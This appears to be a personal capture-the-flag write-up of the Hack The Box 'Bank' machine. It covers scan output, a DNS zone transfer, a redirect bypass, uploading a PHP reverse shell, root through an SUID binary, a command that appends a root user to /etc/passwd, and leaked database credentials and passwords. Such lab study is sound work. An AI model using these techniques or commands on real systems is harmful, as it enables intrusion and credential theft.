# Machine #11 Bank  


## Nmap Results  
<img src="https://nmap.org/images/nmap-logo-256x256.png">  

  * Normal Scan  
   ```console
   PORT   STATE SERVICE
   22/tcp open  ssh
   53/tcp open  domain
   80/tcp open  http
   ```

  * Full Scan same results.

<br/><br/>

## Banner Grabbing of Services
* Service `domain p53`
 ```console
 PORT   STATE SERVICE VERSION
 53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
 | dns-nsid:
 |_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```  
 * DNS server?  


* Service `apache http p80`
 ```console
 PORT   STATE SERVICE VERSION
 80/tcp open  http	Apache httpd 2.4.7 ((Ubuntu))
 ```

<br/><br/>

## Searchsploiting Results   
<img src="https://www.offensive-security.com/wp-content/uploads/2020/05/SearchSploit-1.png" width=400 height=200>   

  * to view the script of the exploit write the following `searchsploit -x [PATH TO SCRIPT]`.
  * Searchsploiting `Apache 2.4.7`
    ```console
    Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uni 
    Apache 2.4.7 mod_status - Scoreboard Handling Race condition
    ```  
  * The second one is a DOS attack so it's non of my business

<br/><br/>

## Gobustering Stuff  
<img src="https://cdn.akamai.steamstatic.com/steam/apps/1092880/capsule_616x353.jpg?t=1605640630" width=400 height=200>  

```console
/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]   
/index.php            (Status: 302) [Size: 7322] [--> login.php]             
/login.php            (Status: 200) [Size: 1974]                             
/logout.php           (Status: 302) [Size: 0] [--> index.php]                
/support.php          (Status: 302) [Size: 3291] [--> login.php]             
/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
```

<br/><br/>

## Thinking Out Loud  
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQr4hzX6KoRN5PjPJjy8QC43K0T-CoXZHawDIxG4jCa9aMD1K8Vl3vhpG2a2OVbiy-i93c&usqp=CAU" width=200 height=200>   


http://bank.htb/login.php found a login page here !!   



sqlmap -u bank.htb --data='inputEmail=&inputPassword=&submit=Submit' --method POST  --batch  


gobuster dns -d bank.htb -W /opt/useful/SecLists/Discovery/Web-Content/big.txt -t20

gobuster dir -u bank.htb/uploads/ -x php,txt,html,jar -w /opt/useful/SecLists/Discovery/Web-Content/big.txt -b 403,404 -t20

Found these as `www-data`

```console
/var/www/bank/bankreports.txt
/var/www/bank/inc
/var/www/bank/inc/footer.php
/var/www/bank/inc/header.php
/var/www/bank/inc/ticket.php
/var/www/bank/inc/user.php
/var/www/bank/index.php
/var/www/bank/login.php
/var/www/bank/logout.php
/var/www/bank/support.php
/var/www/bank/uploads
```

* With this script I was able to get root instantinuously  
  ```console
  -rwsr-xr-x 1 root root 110K Jun 14  2017 /var/htb/bin/emergency (Unknown SUID binary) 
  ```

* With this I was able to gain access to mysql which led me to gaining chris's password that gave me access to all his credit card information and his password but not the ssh password.
```console
 $mysql = new mysqli("localhost", "root", "!@#S3cur3P4ssw0rd!@#", "htbbank");  
```

 * I finally got chris's pass  
```console
mysql> select * from users;
select * from users;
+----+------------------------+----------------+----------------------------------+---------+
| id | username               | email          | password                         | balance |
+----+------------------------+----------------+----------------------------------+---------+
|  1 | Christos Christopoulos | chris@bank.htb | b27179713f7bffc48b9ffd2cf9467620 | 1.337   |
+----+------------------------+----------------+----------------------------------+---------+
1 row in set (0.01 sec)

```  

hashcat -m 500 'b27179713f7bffc48b9ffd2cf9467620' /usr/share/wordlists/rockyou.txt   


Full Name: Christos Christopoulos                                               
Email: chris@bank.htb                                                           
Password: !##HTBB4nkP4ssw0rd!##    

found the password not hashed in the file bankreports  


<br/><br/>

## How Did I Solve the Challenge  
<img src="https://images.lifesizecustomcutouts.com/image/cache/catalog/febProds21/SP000081-500x500.png" width=200 height=200>   

1. Zone transfer to 'bank.htb' where I put it in my /etc/hosts file and this way I was able to open stuff I wasn't able to open on the ip address.  
2. Login page. Didn't find anyhing there.
3. Found a redirect with a file upload there which was easily exploitable especially that it listed the files I uploaded in the same page and I could execute the file from there too.
4. Uploaded a php rev shell in a file with extension `.htb` because of what the comment said ( that it will be executed as php for debugging ).  
5. I escalated my privilege staight to root by just running a script called "emergency" that gave me root shell for "emergencies only", funny.

<br/><br/>


## What Did I learn from this Machine?  

### Bad Redirect  
* I shouldn't be able to see any content when redirecting because as we saw I could change the code of the redirect to 200 OK and view the page and use it without authorization.

### Revealing comments in the UI's Source Code  
* There was a comment that stated that we can use .htb file as php for debuggin which is really bad because this means I can upload any php file I want including a reverse shell, which was what I did.  

### Privilege to Execute File in `/uploads` and Read Directories I Shouldn't Have Been Able To Read
* Which means that I was able to traverse through any directory, except for the uploads, which I was able to execute a file that I knew was inside of it. I think this is considered under bad privileges given for the user www-data.  

### Unauthorized Zone Transfer  
* Which allowed me to view content on the http service I wasn't able to view when I was using the IP address itself.
* We can check out the data with this command `dig axfr bank.htb @10.10.10.29`  

### Don't Put a Root Shell Script For EMERGENCIES ONLY  

## Writeups  

* It turns out that the way I used was not the intended way and the intended way needed me to use a bruteforcer other than gobuster to get to a specific directory that for some reason gobuster doesn't show up.  

* I could've been able to write a password directly in the `/etc/passwd` file, like this   
```console
www-data@bank:/$ echo 'oxdf:$1$q6iY9K5M$eYK1fPmp6OfjbHhWGqZIf0:0:0:pwned:/root:/bin/bash' >> /etc/passwd
```   
* Hashed of course. Then `su` to this user `oxdf`.  


* There are really three ways that a PHP site commonly blocks based on file type:  
1. file extension
2. Content-Type header
3. Mime type, looking at the starting bytes of the content itself and signature that.

<!--@nested-tags:zone_transfer/machines/Bank,bad_redirect/machines/Bank,bad_commenting_practices/machines/Bank,suid/machines/Bank,vuln_file_upload/machines/Bank-->